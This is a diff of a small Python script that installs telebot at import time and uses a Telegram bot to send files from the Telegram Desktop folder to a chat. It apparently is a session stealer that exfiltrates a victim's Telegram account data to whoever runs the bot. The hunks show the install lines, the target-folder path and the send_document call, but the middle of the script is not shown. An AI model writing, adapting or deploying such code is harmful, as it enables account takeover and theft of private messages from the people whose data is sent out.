@@ -1,11 +1,11 @@
 import os
+
+os.system(f"pip install telebot")
+os.system(f"pip install zipfile")
+
 import telebot
 from zipfile import ZipFile, ZIP_DEFLATED
 import zipfile
-
-def depencies_download():
-    os.system(f"pip install telebot")
-    os.system(f"pip install zipfile")
 
 user = os.path.expanduser("#Telegram Desktop Folder")
 home = os.path.expanduser('./')
@@ -26,6 +26,5 @@ def on_last_command(message: telebot.types.Message) -> None:
         bot.send_document(message.chat.id, file)
 
 bot.infinity_polling()
-
 
 
